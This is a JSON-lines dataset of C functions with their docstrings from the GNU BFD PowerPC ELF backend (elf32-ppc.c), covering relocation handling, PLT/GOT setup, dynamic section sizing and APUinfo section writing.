{"docstring": "/* Handle the R_PPC_ADDR16_HA and R_PPC_REL16_HA relocs.  */\n", "func_signal": "static bfd_reloc_status_type\nppc_elf_addr16_ha_reloc (bfd *abfd ATTRIBUTE_UNUSED,\n\t\t\t arelent *reloc_entry,\n\t\t\t asymbol *symbol,\n\t\t\t void *data ATTRIBUTE_UNUSED,\n\t\t\t asection *input_section,\n\t\t\t bfd *output_bfd,\n\t\t\t char **error_message ATTRIBUTE_UNUSED)", "code": "{\n  bfd_vma relocation;\n\n  if (output_bfd != NULL)\n    {\n      reloc_entry->address += input_section->output_offset;\n      return bfd_reloc_ok;\n    }\n\n  if (reloc_entry->address > bfd_get_section_limit (abfd, input_section))\n    return bfd_reloc_outofrange;\n\n  if (bfd_is_com_section (symbol->section))\n    relocation = 0;\n  else\n    relocation = symbol->value;\n\n  relocation += symbol->section->output_section->vma;\n  relocation += symbol->section->output_offset;\n  relocation += reloc_entry->addend;\n  if (reloc_entry->howto->pc_relative)\n    relocation -= reloc_entry->address;\n\n  reloc_entry->addend += (relocation & 0x8000) << 1;\n\n  return bfd_reloc_continue;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Initialize the ppc_elf_howto_table, so that linear accesses can be done.  */\n", "func_signal": "static void\nppc_elf_howto_init (void)", "code": "{\n  unsigned int i, type;\n\n  for (i = 0;\n       i < sizeof (ppc_elf_howto_raw) / sizeof (ppc_elf_howto_raw[0]);\n       i++)\n    {\n      type = ppc_elf_howto_raw[i].type;\n      if (type >= (sizeof (ppc_elf_howto_table)\n\t\t   / sizeof (ppc_elf_howto_table[0])))\n\tabort ();\n      ppc_elf_howto_table[type] = &ppc_elf_howto_raw[i];\n    }\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Return 1 if target is one of ours.  */\n", "func_signal": "static bfd_boolean\nis_ppc_elf_target (const struct bfd_target *targ)", "code": "{\n  extern const bfd_target bfd_elf32_powerpc_vec;\n  extern const bfd_target bfd_elf32_powerpcle_vec;\n\n  return targ == &bfd_elf32_powerpc_vec || targ == &bfd_elf32_powerpcle_vec;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Create a PPC ELF linker hash table.  */\n", "func_signal": "static struct bfd_link_hash_table *\nppc_elf_link_hash_table_create (bfd *abfd)", "code": "{\n  struct ppc_elf_link_hash_table *ret;\n\n  ret = bfd_zmalloc (sizeof (struct ppc_elf_link_hash_table));\n  if (ret == NULL)\n    return NULL;\n\n  if (! _bfd_elf_link_hash_table_init (&ret->elf, abfd,\n\t\t\t\t       ppc_elf_link_hash_newfunc))\n    {\n      free (ret);\n      return NULL;\n    }\n\n  ret->elf.init_plt_refcount.refcount = 0;\n  ret->elf.init_plt_refcount.glist = NULL;\n  ret->elf.init_plt_offset.offset = 0;\n  ret->elf.init_plt_offset.glist = NULL;\n\n  ret->sdata[0].name = \".sdata\";\n  ret->sdata[0].sym_name = \"_SDA_BASE_\";\n  ret->sdata[0].bss_name = \".sbss\";\n\n  ret->sdata[1].name = \".sdata2\";\n  ret->sdata[1].sym_name = \"_SDA2_BASE_\";\n  ret->sdata[1].bss_name = \".sbss2\";\n\n  ret->plt_entry_size = 12;\n  ret->plt_slot_size = 8;\n  ret->plt_initial_entry_size = 72;\n  \n  ret->is_vxworks = 0;\n\n  return &ret->elf.root;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Set the sizes of the dynamic sections.  */\n", "func_signal": "static bfd_boolean\nppc_elf_size_dynamic_sections (bfd *output_bfd ATTRIBUTE_UNUSED,\n\t\t\t       struct bfd_link_info *info)", "code": "{\n  struct ppc_elf_link_hash_table *htab;\n  asection *s;\n  bfd_boolean relocs;\n  bfd *ibfd;\n\n#ifdef DEBUG\n  fprintf (stderr, \"ppc_elf_size_dynamic_sections called\\n\");\n#endif\n\n  htab = ppc_elf_hash_table (info);\n  BFD_ASSERT (htab->elf.dynobj != NULL);\n\n  if (elf_hash_table (info)->dynamic_sections_created)\n    {\n      /* Set the contents of the .interp section to the interpreter.  */\n      if (info->executable)\n\t{\n\t  s = bfd_get_section_by_name (htab->elf.dynobj, \".interp\");\n\t  BFD_ASSERT (s != NULL);\n\t  s->size = sizeof ELF_DYNAMIC_INTERPRETER;\n\t  s->contents = (unsigned char *) ELF_DYNAMIC_INTERPRETER;\n\t}\n    }\n\n  if (htab->old_plt)\n    htab->got_header_size = 16;\n  else\n    htab->got_header_size = 12;\n\n  /* Set up .got offsets for local syms, and space for local dynamic\n     relocs.  */\n  for (ibfd = info->input_bfds; ibfd != NULL; ibfd = ibfd->link_next)\n    {\n      bfd_signed_vma *local_got;\n      bfd_signed_vma *end_local_got;\n      char *lgot_masks;\n      bfd_size_type locsymcount;\n      Elf_Internal_Shdr *symtab_hdr;\n\n      if (!is_ppc_elf_target (ibfd->xvec))\n\tcontinue;\n\n      for (s = ibfd->sections; s != NULL; s = s->next)\n\t{\n\t  struct ppc_elf_dyn_relocs *p;\n\n\t  for (p = ((struct ppc_elf_dyn_relocs *)\n\t\t    elf_section_data (s)->local_dynrel);\n\t       p != NULL;\n\t       p = p->next)\n\t    {\n\t      if (!bfd_is_abs_section (p->sec)\n\t\t  && bfd_is_abs_section (p->sec->output_section))\n\t\t{\n\t\t  /* Input section has been discarded, either because\n\t\t     it is a copy of a linkonce section or due to\n\t\t     linker script /DISCARD/, so we'll be discarding\n\t\t     the relocs too.  */\n\t\t}\n\t      else if (p->count != 0)\n\t\t{\n\t\t  elf_section_data (p->sec)->sreloc->size\n\t\t    += p->count * sizeof (Elf32_External_Rela);\n\t\t  if ((p->sec->output_section->flags\n\t\t       & (SEC_READONLY | SEC_ALLOC))\n\t\t      == (SEC_READONLY | SEC_ALLOC))\n\t\t    info->flags |= DF_TEXTREL;\n\t\t}\n\t    }\n\t}\n\n      local_got = elf_local_got_refcounts (ibfd);\n      if (!local_got)\n\tcontinue;\n\n      symtab_hdr = &elf_tdata (ibfd)->symtab_hdr;\n      locsymcount = symtab_hdr->sh_info;\n      end_local_got = local_got + locsymcount;\n      lgot_masks = (char *) end_local_got;\n      for (; local_got < end_local_got; ++local_got, ++lgot_masks)\n\tif (*local_got > 0)\n\t  {\n\t    if (*lgot_masks == (TLS_TLS | TLS_LD))\n\t      {\n\t\t/* If just an LD reloc, we'll just use\n\t\t   htab->tlsld_got.offset.  */\n\t\thtab->tlsld_got.refcount += 1;\n\t\t*local_got = (bfd_vma) -1;\n\t      }\n\t    else\n\t      {\n\t\tunsigned int need = 0;\n\t\tif ((*lgot_masks & TLS_TLS) != 0)\n\t\t  {\n\t\t    if ((*lgot_masks & TLS_GD) != 0)\n\t\t      need += 8;\n\t\t    if ((*lgot_masks & (TLS_TPREL | TLS_TPRELGD)) != 0)\n\t\t      need += 4;\n\t\t    if ((*lgot_masks & TLS_DTPREL) != 0)\n\t\t      need += 4;\n\t\t  }\n\t\telse\n\t\t  need += 4;\n\t\t*local_got = allocate_got (htab, need);\n\t\tif (info->shared)\n\t\t  htab->relgot->size += (need\n\t\t\t\t\t * (sizeof (Elf32_External_Rela) / 4));\n\t      }\n\t  }\n\telse\n\t  *local_got = (bfd_vma) -1;\n    }\n\n  if (htab->tlsld_got.refcount > 0)\n    {\n      htab->tlsld_got.offset = allocate_got (htab, 8);\n      if (info->shared)\n\thtab->relgot->size += sizeof (Elf32_External_Rela);\n    }\n  else\n    htab->tlsld_got.offset = (bfd_vma) -1;\n\n  if (htab->is_vxworks)\n    {\n      /* Save the PLT symbol in the hash table for easy access.\n\t Mark GOT and PLT syms as having relocations; they might not,\n\t but we won't know for sure until we build the GOT in\n\t finish_dynamic_symbol.  */\n\n      if (htab->elf.hgot)\n\thtab->elf.hgot->indx = -2;\n      htab->hplt = elf_link_hash_lookup (elf_hash_table (info),\n\t\t\t\t\t \"_PROCEDURE_LINKAGE_TABLE_\",\n\t\t\t\t\t FALSE, FALSE, FALSE);\n      if (htab->hplt)\n\thtab->hplt->indx = -2;\n      /* If the PLT is executable then give the symbol function type.  */\n      if (htab->hplt && htab->plt->flags & SEC_CODE)\n       htab->hplt->type = STT_FUNC;\n    }\n\n  /* Allocate space for global sym dynamic relocs.  */\n  elf_link_hash_traverse (elf_hash_table (info), allocate_dynrelocs, info);\n\n  if (htab->got != NULL && !htab->is_vxworks)\n    {\n      unsigned int g_o_t = 32768;\n\n      /* If we haven't allocated the header, do so now.  When we get here,\n\t for old plt/got the got size will be 0 to 32764 (not allocated),\n\t or 32780 to 65536 (header allocated).  For new plt/got, the\n\t corresponding ranges are 0 to 32768 and 32780 to 65536.  */\n      if (htab->got->size <= 32768)\n\t{\n\t  g_o_t = htab->got->size;\n\t  if (htab->old_plt)\n\t    g_o_t += 4;\n\t  htab->got->size += htab->got_header_size;\n\t}\n\n      htab->elf.hgot->root.u.def.value = g_o_t;\n    }\n\n  if (htab->glink != NULL && htab->glink->size != 0)\n    {\n      htab->glink_pltresolve = htab->glink->size;\n      /* Space for the branch table.  */\n      htab->glink->size += htab->glink->size / (GLINK_ENTRY_SIZE / 4) - 4;\n      /* Pad out to align the start of PLTresolve.  */\n      htab->glink->size += -htab->glink->size & 15;\n      htab->glink->size += GLINK_PLTRESOLVE;\n    }\n\n  /* We've now determined the sizes of the various dynamic sections.\n     Allocate memory for them.  */\n  relocs = FALSE;\n  for (s = htab->elf.dynobj->sections; s != NULL; s = s->next)\n    {\n      bfd_boolean strip_section = TRUE;\n\n      if ((s->flags & SEC_LINKER_CREATED) == 0)\n\tcontinue;\n\n      if (s == htab->plt\n\t  || s == htab->glink\n\t  || s == htab->got\n\t  || s == htab->sgotplt\n\t  || s == htab->sbss\n\t  || s == htab->dynbss\n\t  || s == htab->dynsbss)\n\t{\n\t  /* We'd like to strip these sections if they aren't needed, but if\n\t     we've exported dynamic symbols from them we must leave them.\n\t     It's too late to tell BFD to get rid of the symbols.  */\n\t  if ((s == htab->plt || s == htab->got) && htab->hplt != NULL)\n\t    strip_section = FALSE;\n\t  /* Strip this section if we don't need it; see the\n\t     comment below.  */\n\t}\n      else if (s == htab->sdata[0].section\n\t       || s == htab->sdata[1].section)\n\t{\n\t  /* Strip these too.  */\n\t}\n      else if (strncmp (bfd_get_section_name (dynobj, s), \".rela\", 5) == 0)\n\t{\n\t  if (s->size != 0)\n\t    {\n\t      /* Remember whether there are any relocation sections.  */\n\t      relocs = TRUE;\n\n\t      /* We use the reloc_count field as a counter if we need\n\t\t to copy relocs into the output file.  */\n\t      s->reloc_count = 0;\n\t    }\n\t}\n      else\n\t{\n\t  /* It's not one of our sections, so don't allocate space.  */\n\t  continue;\n\t}\n\n      if (s->size == 0 && strip_section)\n\t{\n\t  /* If we don't need this section, strip it from the\n\t     output file.  This is mostly to handle .rela.bss and\n\t     .rela.plt.  We must create both sections in\n\t     create_dynamic_sections, because they must be created\n\t     before the linker maps input sections to output\n\t     sections.  The linker does that before\n\t     adjust_dynamic_symbol is called, and it is that\n\t     function which decides whether anything needs to go\n\t     into these sections.  */\n\t  s->flags |= SEC_EXCLUDE;\n\t  continue;\n\t}\n\n      if ((s->flags & SEC_HAS_CONTENTS) == 0)\n\tcontinue;\n\n      /* Allocate memory for the section contents.  */\n      s->contents = bfd_zalloc (htab->elf.dynobj, s->size);\n      if (s->contents == NULL)\n\treturn FALSE;\n    }\n\n  if (htab->elf.dynamic_sections_created)\n    {\n      /* Add some entries to the .dynamic section.  We fill in the\n\t values later, in ppc_elf_finish_dynamic_sections, but we\n\t must add the entries now so that we get the correct size for\n\t the .dynamic section.  The DT_DEBUG entry is filled in by the\n\t dynamic linker and used by the debugger.  */\n#define add_dynamic_entry(TAG, VAL) \\\n  _bfd_elf_add_dynamic_entry (info, TAG, VAL)\n\n      if (info->executable)\n\t{\n\t  if (!add_dynamic_entry (DT_DEBUG, 0))\n\t    return FALSE;\n\t}\n\n      if (htab->plt != NULL && htab->plt->size != 0)\n\t{\n\t  if (!add_dynamic_entry (DT_PLTGOT, 0)\n\t      || !add_dynamic_entry (DT_PLTRELSZ, 0)\n\t      || !add_dynamic_entry (DT_PLTREL, DT_RELA)\n\t      || !add_dynamic_entry (DT_JMPREL, 0))\n\t    return FALSE;\n\t}\n\n      if (htab->glink != NULL && htab->glink->size != 0)\n\t{\n\t  if (!add_dynamic_entry (DT_PPC_GOT, 0))\n\t    return FALSE;\n\t}\n\n      if (relocs)\n\t{\n\t  if (!add_dynamic_entry (DT_RELA, 0)\n\t      || !add_dynamic_entry (DT_RELASZ, 0)\n\t      || !add_dynamic_entry (DT_RELAENT, sizeof (Elf32_External_Rela)))\n\t    return FALSE;\n\t}\n\n      /* If any dynamic relocs apply to a read-only section, then we\n\t need a DT_TEXTREL entry.  */\n      if ((info->flags & DF_TEXTREL) == 0)\n\telf_link_hash_traverse (elf_hash_table (info), readonly_dynrelocs,\n\t\t\t\tinfo);\n\n      if ((info->flags & DF_TEXTREL) != 0)\n\t{\n\t  if (!add_dynamic_entry (DT_TEXTREL, 0))\n\t    return FALSE;\n\t}\n    }\n#undef add_dynamic_entry\n\n  return TRUE;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Finish up dynamic symbol handling.  We set the contents of various\n   dynamic sections here.  */\n", "func_signal": "static bfd_boolean\nppc_elf_finish_dynamic_symbol (bfd *output_bfd,\n\t\t\t       struct bfd_link_info *info,\n\t\t\t       struct elf_link_hash_entry *h,\n\t\t\t       Elf_Internal_Sym *sym)", "code": "{\n  struct ppc_elf_link_hash_table *htab;\n  struct plt_entry *ent;\n  bfd_boolean doneone;\n\n#ifdef DEBUG\n  fprintf (stderr, \"ppc_elf_finish_dynamic_symbol called for %s\",\n\t   h->root.root.string);\n#endif\n\n  htab = ppc_elf_hash_table (info);\n  BFD_ASSERT (htab->elf.dynobj != NULL);\n\n  doneone = FALSE;\n  for (ent = h->plt.plist; ent != NULL; ent = ent->next)\n    if (ent->plt.offset != (bfd_vma) -1)\n      {\n\tif (!doneone)\n\t  {\n\t    Elf_Internal_Rela rela;\n\t    bfd_byte *loc;\n\t    bfd_vma reloc_index;\n\n\t    if (!(htab->old_plt || htab->is_vxworks))\n\t      reloc_index = ent->plt.offset / 4;\n\t    else\n\t      {\n\t\treloc_index = ((ent->plt.offset - htab->plt_initial_entry_size)\n\t\t\t       / htab->plt_slot_size);\n\t\tif (reloc_index > PLT_NUM_SINGLE_ENTRIES\n\t\t    && !htab->is_vxworks)\n\t\t  reloc_index -= (reloc_index - PLT_NUM_SINGLE_ENTRIES) / 2;\n\t      }\n\n\t    /* This symbol has an entry in the procedure linkage table.\n\t       Set it up.  */\n\t    if (htab->is_vxworks)\n\t      {\n\t\tbfd_vma got_offset;\n\t\tconst bfd_vma *plt_entry;\n\t\t\n\t\t/* The first three entries in .got.plt are reserved.  */\n\t\tgot_offset = (reloc_index + 3) * 4;\n\n\t\t/* Use the right PLT. */\n\t\tplt_entry = info->shared ? ppc_elf_vxworks_pic_plt_entry\n\t\t\t    : ppc_elf_vxworks_plt_entry;\n\n\t\t/* Fill in the .plt on VxWorks.  */\n\t\tif (info->shared)\n\t\t  {\n\t\t    bfd_vma got_offset_hi = (got_offset >> 16)\n\t\t\t\t\t    + ((got_offset & 0x8000) >> 15);\n\n\t\t    bfd_put_32 (output_bfd,\n\t\t\t\tplt_entry[0] | (got_offset_hi & 0xffff),\n\t\t\t\thtab->plt->contents + ent->plt.offset + 0);\n\t\t    bfd_put_32 (output_bfd,\n\t\t\t\tplt_entry[1] | (got_offset & 0xffff),\n\t\t\t\thtab->plt->contents + ent->plt.offset + 4);\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    bfd_vma got_loc\n\t\t      = (got_offset\n\t\t\t + htab->elf.hgot->root.u.def.value\n\t\t\t + htab->elf.hgot->root.u.def.section->output_offset\n\t\t\t + htab->elf.hgot->root.u.def.section->output_section->vma);\n\t\t    bfd_vma got_loc_hi = (got_loc >> 16)\n\t\t\t\t\t + ((got_loc & 0x8000) >> 15);\n\n\t\t    bfd_put_32 (output_bfd,\n\t\t\t\tplt_entry[0] | (got_loc_hi & 0xffff),\n\t\t\t\thtab->plt->contents + ent->plt.offset + 0);\n\t\t    bfd_put_32 (output_bfd,\n\t\t\t\tplt_entry[1] | (got_loc & 0xffff),\n\t\t\t\thtab->plt->contents + ent->plt.offset + 4);\n\t\t  }\n\n\t\tbfd_put_32 (output_bfd, plt_entry[2],\n\t\t\t    htab->plt->contents + ent->plt.offset + 8);\n\t\tbfd_put_32 (output_bfd, plt_entry[3],\n\t\t\t    htab->plt->contents + ent->plt.offset + 12);\n\n\t\t/* This instruction is an immediate load.  The value loaded is\n\t\t   the byte offset of the R_PPC_JMP_SLOT relocation from the\n\t\t   start of the .rela.plt section.  The value is stored in the\n\t\t   low-order 16 bits of the load instruction.  */\n\t\t/* NOTE: It appears that this is now an index rather than a\n\t\t   prescaled offset.  */\n\t\tbfd_put_32 (output_bfd, \n\t\t\t    plt_entry[4] | reloc_index,\n\t\t\t    htab->plt->contents + ent->plt.offset + 16);\n\t\t/* This instruction is a PC-relative branch whose target is\n\t\t   the start of the PLT section.  The address of this branch\n\t\t   instruction is 20 bytes beyond the start of this PLT entry.\n\t\t   The address is encoded in bits 6-29, inclusive.  The value\n\t\t   stored is right-shifted by two bits, permitting a 26-bit\n\t\t   offset.  */\n\t\tbfd_put_32 (output_bfd, \n\t\t\t    (plt_entry[5] \n\t\t\t     | (-(ent->plt.offset + 20) & 0x03fffffc)),\n\t\t\t    htab->plt->contents + ent->plt.offset + 20);\n\t\tbfd_put_32 (output_bfd, plt_entry[6],\n\t\t\t    htab->plt->contents + ent->plt.offset + 24);\n\t\tbfd_put_32 (output_bfd, plt_entry[7],\n\t\t\t    htab->plt->contents + ent->plt.offset + 28);\n\n\t\t/* Fill in the GOT entry corresponding to this PLT slot with\n\t\t   the address immediately after the the \"bctr\" instruction\n\t\t   in this PLT entry.  */\n\t\tbfd_put_32 (output_bfd, (htab->plt->output_section->vma\n\t\t\t\t\t + htab->plt->output_offset\n\t\t\t\t\t + ent->plt.offset + 16),\n\t\t\t    htab->sgotplt->contents + got_offset);\n\n\t\tif (!info->shared)\n\t\t  {\n\t\t    /* Fill in a couple of entries in .rela.plt.unloaded.  */\n\t\t    loc = htab->srelplt2->contents\n\t\t      + ((VXWORKS_PLTRESOLVE_RELOCS + reloc_index\n\t\t\t  * VXWORKS_PLT_NON_JMP_SLOT_RELOCS)\n\t\t\t * sizeof (Elf32_External_Rela));\n\n\t\t    /* Provide the @ha relocation for the first instruction.  */\n\t\t    rela.r_offset = (htab->plt->output_section->vma\n\t\t\t\t     + htab->plt->output_offset\n\t\t\t\t     + ent->plt.offset + 2);\n\t\t    rela.r_info = ELF32_R_INFO (htab->elf.hgot->indx,\n\t\t\t\t\t\tR_PPC_ADDR16_HA);\n\t\t    rela.r_addend = got_offset;\n\t\t    bfd_elf32_swap_reloca_out (output_bfd, &rela, loc);\n\t\t    loc += sizeof (Elf32_External_Rela);\n\n\t\t    /* Provide the @l relocation for the second instruction.  */\n\t\t    rela.r_offset = (htab->plt->output_section->vma\n\t\t\t\t     + htab->plt->output_offset\n\t\t\t\t     + ent->plt.offset + 6);\n\t\t    rela.r_info = ELF32_R_INFO (htab->elf.hgot->indx,\n\t\t\t\t\t\tR_PPC_ADDR16_LO);\n\t\t    rela.r_addend = got_offset;\n\t\t    bfd_elf32_swap_reloca_out (output_bfd, &rela, loc);\n\t\t    loc += sizeof (Elf32_External_Rela);\n\n\t\t    /* Provide a relocation for the GOT entry corresponding to this\n\t\t       PLT slot.  Point it at the middle of the .plt entry.  */\n\t\t    rela.r_offset = (htab->sgotplt->output_section->vma\n\t\t\t\t     + htab->sgotplt->output_offset\n\t\t\t\t     + got_offset);\n\t\t    rela.r_info = ELF32_R_INFO (htab->hplt->indx,\n\t\t\t\t\t\tR_PPC_ADDR32);\n\t\t    rela.r_addend = ent->plt.offset + 16;\n\t\t    bfd_elf32_swap_reloca_out (output_bfd, &rela, loc);\n\t\t  }\n\n\t\t/* VxWorks uses non-standard semantics for R_PPC_JMP_SLOT.\n\t\t   In particular, the offset for the relocation is not the\n\t\t   address of the PLT entry for this function, as specified\n\t\t   by the ABI.  Instead, the offset is set to the address of\n\t\t   the GOT slot for this function.  See EABI 4.4.4.1.  */\n\t\trela.r_offset = (htab->sgotplt->output_section->vma\n\t\t\t\t + htab->sgotplt->output_offset\n\t\t\t\t + got_offset);\n\n\t      }\n\t    else\n\t      {\n\t\trela.r_offset = (htab->plt->output_section->vma\n\t\t\t\t + htab->plt->output_offset\n\t\t\t\t + ent->plt.offset);\n\t\tif (htab->old_plt)\n\t\t  {\n\t\t    /* We don't need to fill in the .plt.  The ppc dynamic\n\t\t       linker will fill it in.  */\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    bfd_vma val = (htab->glink_pltresolve + ent->plt.offset\n\t\t\t\t   + htab->glink->output_section->vma\n\t\t\t\t   + htab->glink->output_offset);\n\t\t    bfd_put_32 (output_bfd, val,\n\t\t\t\thtab->plt->contents + ent->plt.offset);\n\t\t  }\n\t      }\n\n\t    /* Fill in the entry in the .rela.plt section.  */\n\t    rela.r_info = ELF32_R_INFO (h->dynindx, R_PPC_JMP_SLOT);\n\t    rela.r_addend = 0;\n\n\t    loc = (htab->relplt->contents\n\t\t   + reloc_index * sizeof (Elf32_External_Rela));\n\t    bfd_elf32_swap_reloca_out (output_bfd, &rela, loc);\n\n\t    if (!h->def_regular)\n\t      {\n\t\t/* Mark the symbol as undefined, rather than as defined in\n\t\t   the .plt section.  Leave the value alone.  */\n\t\tsym->st_shndx = SHN_UNDEF;\n\t\t/* If the symbol is weak, we do need to clear the value.\n\t\t   Otherwise, the PLT entry would provide a definition for\n\t\t   the symbol even if the symbol wasn't defined anywhere,\n\t\t   and so the symbol would never be NULL.  */\n\t\tif (!h->ref_regular_nonweak)\n\t\t  sym->st_value = 0;\n\t      }\n\t    doneone = TRUE;\n\t  }\n\n\tif (!htab->old_plt)\n\t  {\n\t    bfd_vma plt;\n\t    unsigned char *p;\n\n\t    plt = (ent->plt.offset\n\t\t   + htab->plt->output_section->vma\n\t\t   + htab->plt->output_offset);\n\t    p = (unsigned char *) htab->glink->contents + ent->glink_offset;\n\n\t    if (info->shared || info->pie)\n\t      {\n\t\tbfd_vma got = 0;\n\n\t\tif (ent->addend >= 32768)\n\t\t  got = (ent->addend\n\t\t\t + ent->sec->output_section->vma\n\t\t\t + ent->sec->output_offset);\n\t\telse if (htab->elf.hgot != NULL)\n\t\t  got = (htab->elf.hgot->root.u.def.value\n\t\t\t + htab->elf.hgot->root.u.def.section->output_section->vma\n\t\t\t + htab->elf.hgot->root.u.def.section->output_offset);\n\n\t\tplt -= got;\n\n\t\tif (plt + 0x8000 < 0x10000)\n\t\t  {\n\t\t    bfd_put_32 (output_bfd, LWZ_11_30 + PPC_LO (plt), p);\n\t\t    p += 4;\n\t\t    bfd_put_32 (output_bfd, MTCTR_11, p);\n\t\t    p += 4;\n\t\t    bfd_put_32 (output_bfd, BCTR, p);\n\t\t    p += 4;\n\t\t    bfd_put_32 (output_bfd, NOP, p);\n\t\t    p += 4;\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    bfd_put_32 (output_bfd, ADDIS_11_30 + PPC_HA (plt), p);\n\t\t    p += 4;\n\t\t    bfd_put_32 (output_bfd, LWZ_11_11 + PPC_LO (plt), p);\n\t\t    p += 4;\n\t\t    bfd_put_32 (output_bfd, MTCTR_11, p);\n\t\t    p += 4;\n\t\t    bfd_put_32 (output_bfd, BCTR, p);\n\t\t    p += 4;\n\t\t  }\n\t      }\n\t    else\n\t      {\n\t\tbfd_put_32 (output_bfd, LIS_11 + PPC_HA (plt), p);\n\t\tp += 4;\n\t\tbfd_put_32 (output_bfd, LWZ_11_11 + PPC_LO (plt), p);\n\t\tp += 4;\n\t\tbfd_put_32 (output_bfd, MTCTR_11, p);\n\t\tp += 4;\n\t\tbfd_put_32 (output_bfd, BCTR, p);\n\t\tp += 4;\n\n\t\t/* We only need one non-PIC glink stub.  */\n\t\tbreak;\n\t      }\n\t  }\n\telse\n\t  break;\n      }\n\n  if (h->needs_copy)\n    {\n      asection *s;\n      Elf_Internal_Rela rela;\n      bfd_byte *loc;\n\n      /* This symbols needs a copy reloc.  Set it up.  */\n\n#ifdef DEBUG\n      fprintf (stderr, \", copy\");\n#endif\n\n      BFD_ASSERT (h->dynindx != -1);\n\n      if (ppc_elf_hash_entry (h)->has_sda_refs)\n\ts = htab->relsbss;\n      else\n\ts = htab->relbss;\n      BFD_ASSERT (s != NULL);\n\n      rela.r_offset = (h->root.u.def.value\n\t\t       + h->root.u.def.section->output_section->vma\n\t\t       + h->root.u.def.section->output_offset);\n      rela.r_info = ELF32_R_INFO (h->dynindx, R_PPC_COPY);\n      rela.r_addend = 0;\n      loc = s->contents + s->reloc_count++ * sizeof (Elf32_External_Rela);\n      bfd_elf32_swap_reloca_out (output_bfd, &rela, loc);\n    }\n\n#ifdef DEBUG\n  fprintf (stderr, \"\\n\");\n#endif\n\n  /* Mark some specially defined symbols as absolute.  */\n  if (strcmp (h->root.root.string, \"_DYNAMIC\") == 0\n      || (!htab->is_vxworks\n\t  && (h == htab->elf.hgot\n\t      || strcmp (h->root.root.string,\n\t\t\t \"_PROCEDURE_LINKAGE_TABLE_\") == 0)))\n    sym->st_shndx = SHN_ABS;\n\n  return TRUE;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Finally we can generate the output section.  */\n", "func_signal": "static void\nppc_elf_final_write_processing (bfd *abfd, bfd_boolean linker ATTRIBUTE_UNUSED)", "code": "{\n  bfd_byte *buffer;\n  asection *asec;\n  unsigned i;\n  unsigned num_entries;\n  bfd_size_type length;\n\n  asec = bfd_get_section_by_name (abfd, APUINFO_SECTION_NAME);\n  if (asec == NULL)\n    return;\n\n  if (apuinfo_list_length () == 0)\n    return;\n\n  length = asec->size;\n  if (length < 20)\n    return;\n\n  buffer = bfd_malloc (length);\n  if (buffer == NULL)\n    {\n      (*_bfd_error_handler)\n\t(_(\"failed to allocate space for new APUinfo section.\"));\n      return;\n    }\n\n  /* Create the apuinfo header.  */\n  num_entries = apuinfo_list_length ();\n  bfd_put_32 (abfd, sizeof APUINFO_LABEL, buffer);\n  bfd_put_32 (abfd, num_entries * 4, buffer + 4);\n  bfd_put_32 (abfd, 0x2, buffer + 8);\n  strcpy ((char *) buffer + 12, APUINFO_LABEL);\n\n  length = 20;\n  for (i = 0; i < num_entries; i++)\n    {\n      bfd_put_32 (abfd, apuinfo_list_element (i), buffer + length);\n      length += 4;\n    }\n\n  if (length != asec->size)\n    (*_bfd_error_handler) (_(\"failed to compute new APUinfo section.\"));\n\n  if (! bfd_set_section_contents (abfd, asec, buffer, (file_ptr) 0, length))\n    (*_bfd_error_handler) (_(\"failed to install new APUinfo section.\"));\n\n  free (buffer);\n\n  apuinfo_list_finish ();\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Find any dynamic relocs that apply to read-only sections.  */\n", "func_signal": "static bfd_boolean\nreadonly_dynrelocs (struct elf_link_hash_entry *h, void *info)", "code": "{\n  struct ppc_elf_dyn_relocs *p;\n\n  if (h->root.type == bfd_link_hash_indirect)\n    return TRUE;\n\n  if (h->root.type == bfd_link_hash_warning)\n    h = (struct elf_link_hash_entry *) h->root.u.i.link;\n\n  for (p = ppc_elf_hash_entry (h)->dyn_relocs; p != NULL; p = p->next)\n    {\n      asection *s = p->sec->output_section;\n\n      if (s != NULL\n\t  && ((s->flags & (SEC_READONLY | SEC_ALLOC))\n\t      == (SEC_READONLY | SEC_ALLOC)))\n\t{\n\t  ((struct bfd_link_info *) info)->flags |= DF_TEXTREL;\n\n\t  /* Not an error, just cut short the traversal.  */\n\t  return FALSE;\n\t}\n    }\n  return TRUE;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Prevent the output section from accumulating the input sections'\n   contents.  We have already stored this in our linked list structure.  */\n", "func_signal": "static bfd_boolean\nppc_elf_write_section (bfd *abfd ATTRIBUTE_UNUSED,\n\t\t       asection *asec,\n\t\t       bfd_byte *contents ATTRIBUTE_UNUSED)", "code": "{\n  return (apuinfo_list_length ()\n\t  && strcmp (asec->name, APUINFO_SECTION_NAME) == 0);\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
